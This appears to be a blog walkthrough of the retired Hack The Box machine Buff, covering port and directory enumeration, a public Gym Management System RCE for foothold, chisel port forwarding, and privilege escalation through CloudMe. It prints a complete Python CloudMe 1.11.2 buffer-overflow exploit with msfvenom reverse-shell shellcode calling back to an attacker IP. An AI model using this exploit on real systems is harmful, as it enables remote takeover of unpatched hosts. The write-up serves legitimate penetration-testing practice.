---
layout: post  
title: "Buff: Hack The Box Walkthrough"
date: 2020-11-22 23:49:22 +0000
last_modified_at: 2020-11-22 23:49:22 +0000
category: Walkthrough
tags: ["Hack The Box", Buff, retired, Windows, Easy]
comments: true
protect: false
image:
  feature: buff-htb-walkthrough.png
---

This post documents the complete walkthrough of Buff, a retired vulnerable [VM][1] created by [egotisticalSW][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Buff is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.198 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-07-19 08:09:57 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.198
Discovered open port 7680/tcp on 10.10.10.198
```

Hold up. Am I seeing things? Only two open ports? Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p7680,8080 -A --reason 10.10.10.198 -oN nmap.txt
...
PORT     STATE    SERVICE   REASON          VERSION
7680/tcp filtered pando-pub no-response
8080/tcp open     http      syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

Wow, this is more of a shit show than I expect. Well, in any case, this is what the `http` service looks like.

{% include image.html image_alt="cf27179d.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/cf27179d.png" %}

I see now where the name of the box gets its inspiration from. :laughing:

### Directory/File Enumeration

Let's see what we can glean from `wfuzz` and `quickhits.txt` from SecLists.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc '403,404' http://10.10.10.198:8080/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.198:8080/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000117:   200        2 L      11 W     66 Ch       "/.gitattributes"
000000501:   200        109 L    225 W    2532 Ch     "/admin%20/"
000000511:   200        109 L    225 W    2532 Ch     "/Admin/"
000000512:   200        109 L    225 W    2532 Ch     "/admin/"
000001177:   200        121 L    278 W    4282 Ch     "/edit.php"
000001220:   503        39 L     98 W     1058 Ch     "/examples/"
000001965:   200        16 L     39 W     309 Ch      "/README.md"
000001971:   200        3 L      20 W     137 Ch      "/register.php"
000002256:   301        9 L      30 W     344 Ch      "/Upload"
000002249:   200        4 L      24 W     209 Ch      "/up.php"
000002262:   200        2 L      12 W     107 Ch      "/upload.php"

Total time: 175.7757
Processed Requests: 2439
Filtered Requests: 2428
Requests/sec.: 13.87563
```

Pivoting on `README.md`, I was able to [download](https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/) the source code of the so-called Gym Management System.

```
# curl -s http://10.10.10.198:8080/README.md
gym management system
===================

Gym Management System

This the my gym management system it is made using PHP,CSS,HTML,Jquery,Twitter Bootstrap.
All sql table info can be found in table.sql.


more free projects

click here - https://projectworlds.in


YouTube Demo - https://youtu.be/J_7G_AahgSw
```

Sure saves plenty of time and effort from fuzzing with a larger wordlist.

{% include image.html image_alt="43d91d9f.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/43d91d9f.png" %}

### Gym Management System 1.0 - Unauthenticated Remote Code Execution

A little Googling produces the [exploit](https://www.exploit-db.com/exploits/48506) that's a perfect fit for this web application.

{% include image.html image_alt="02a8cb21.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/02a8cb21.png" %}

## Foothold

I'd better copy `nc.exe` over to get a better shell.

{% include image.html image_alt="eef4f814.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/eef4f814.png" %}

There we go.

{% include image.html image_alt="00c96792.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/00c96792.png" %}

What is `CloudMe_1112.exe`? Looks interesting. Well, the file `user.txt` is not surprisingly at `shaun`'s desktop.

{% include image.html image_alt="40738b05.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/40738b05.png" %}

## Privilege Escalation

During enumeration of `shaun`'s account, I noticed that `8888/tcp` is listening on the loopback interface.

{% include image.html image_alt="4e1a5d84.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/4e1a5d84.png" %}

Pivoting on the process ID, a process `CloudMe.exe` was the one responsible for it.

{% include image.html image_alt="d920b226.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/d920b226.png" %}

### CloudMe 1.11.2 - Buffer Overflow (PoC)

A little Googling produces the [exploit](https://www.exploit-db.com/exploits/48389) I think is relevant to my observation.

The only caveat is to forward port `8888/tcp` to my machine's loopback interface. That can be easily done with `chisel`. How `chisel` work is beyond the scope of this write-up. I suggest reading `README.md` on the GitHub [repository](https://github.com/jpillora/chisel) for more details.

#### On my attacking machine

```
# chisel server -p 9999 --reverse
```

This set up a `chisel` server listening at `9999/tcp` on all interfaces, and allow the client to specify reverse port forwarding remotes.

#### On the remote machine

I need to send a copy of the `chisel` [binary](https://github.com/jpillora/chisel/releases/download/v1.6.0/chisel_1.6.0_windows_amd64.gz) for Windows over, similar to how I transfer `nc.exe` over. Run the following command:

```
C:\Users\shaun\Downloads> start chisel client 10.10.16.23:9999 R:8888:127.0.0.1:8888
```

You should see something like this on your server.

{% include image.html image_alt="5082bd14.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/5082bd14.png" %}

#### Exploit

I ran exploit EDB-ID [48389](https://www.exploit-db.com/exploits/48389) with the following `msfvenom` payload.

<div class="filename"><span>cloudme.py</span></div>

```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.23 LPORT=4444 -b '\x00\x0a\x0d' -f python
payload =  b""
payload += b"\xba\xcb\xa7\xa2\x1b\xd9\xc5\xd9\x74\x24\xf4\x5e\x31"
payload += b"\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x9d\xa9\x40"
payload += b"\xee\xdd\x5e\x06\x11\x1d\x9f\x67\x9b\xf8\xae\xa7\xff"
payload += b"\x89\x81\x17\x8b\xdf\x2d\xd3\xd9\xcb\xa6\x91\xf5\xfc"
payload += b"\x0f\x1f\x20\x33\x8f\x0c\x10\x52\x13\x4f\x45\xb4\x2a"
payload += b"\x80\x98\xb5\x6b\xfd\x51\xe7\x24\x89\xc4\x17\x40\xc7"
payload += b"\xd4\x9c\x1a\xc9\x5c\x41\xea\xe8\x4d\xd4\x60\xb3\x4d"
payload += b"\xd7\xa5\xcf\xc7\xcf\xaa\xea\x9e\x64\x18\x80\x20\xac"
payload += b"\x50\x69\x8e\x91\x5c\x98\xce\xd6\x5b\x43\xa5\x2e\x98"
payload += b"\xfe\xbe\xf5\xe2\x24\x4a\xed\x45\xae\xec\xc9\x74\x63"
payload += b"\x6a\x9a\x7b\xc8\xf8\xc4\x9f\xcf\x2d\x7f\x9b\x44\xd0"
payload += b"\xaf\x2d\x1e\xf7\x6b\x75\xc4\x96\x2a\xd3\xab\xa7\x2c"
payload += b"\xbc\x14\x02\x27\x51\x40\x3f\x6a\x3e\xa5\x72\x94\xbe"
payload += b"\xa1\x05\xe7\x8c\x6e\xbe\x6f\xbd\xe7\x18\x68\xc2\xdd"
payload += b"\xdd\xe6\x3d\xde\x1d\x2f\xfa\x8a\x4d\x47\x2b\xb3\x05"
payload += b"\x97\xd4\x66\x89\xc7\x7a\xd9\x6a\xb7\x3a\x89\x02\xdd"
payload += b"\xb4\xf6\x33\xde\x1e\x9f\xde\x25\xc9\xaa\x14\x35\x1e"
payload += b"\xc3\x2a\x35\x31\x4f\xa2\xd3\x5b\x7f\xe2\x4c\xf4\xe6"
payload += b"\xaf\x06\x65\xe6\x65\x63\xa5\x6c\x8a\x94\x68\x85\xe7"
payload += b"\x86\x1d\x65\xb2\xf4\x88\x7a\x68\x90\x57\xe8\xf7\x60"
payload += b"\x11\x11\xa0\x37\x76\xe7\xb9\xdd\x6a\x5e\x10\xc3\x76"
payload += b"\x06\x5b\x47\xad\xfb\x62\x46\x20\x47\x41\x58\xfc\x48"
payload += b"\xcd\x0c\x50\x1f\x9b\xfa\x16\xc9\x6d\x54\xc1\xa6\x27"
payload += b"\x30\x94\x84\xf7\x46\x99\xc0\x81\xa6\x28\xbd\xd7\xd9"
payload += b"\x85\x29\xd0\xa2\xfb\xc9\x1f\x79\xb8\xfa\x55\x23\xe9"
payload += b"\x92\x33\xb6\xab\xfe\xc3\x6d\xef\x06\x40\x87\x90\xfc"
payload += b"\x58\xe2\x95\xb9\xde\x1f\xe4\xd2\x8a\x1f\x5b\xd2\x9e"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

foo = padding1 + EIP + NOPS + payload + overrun

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,8888))
  s.send(foo)
except Exception as e:
  print(sys.exc_value)
```

{% include image.html image_alt="5e48a6d7.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/5e48a6d7.png" %}

Getting `root.txt` with Administrator privileges is trivial.

{% include image.html image_alt="c3e881aa.png" image_src="/50a54b87-e758-42bc-8b5a-1b8e183b1ef7/c3e881aa.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/263
[2]: https://www.hackthebox.eu/home/users/profile/94858
[3]: https://www.hackthebox.eu/
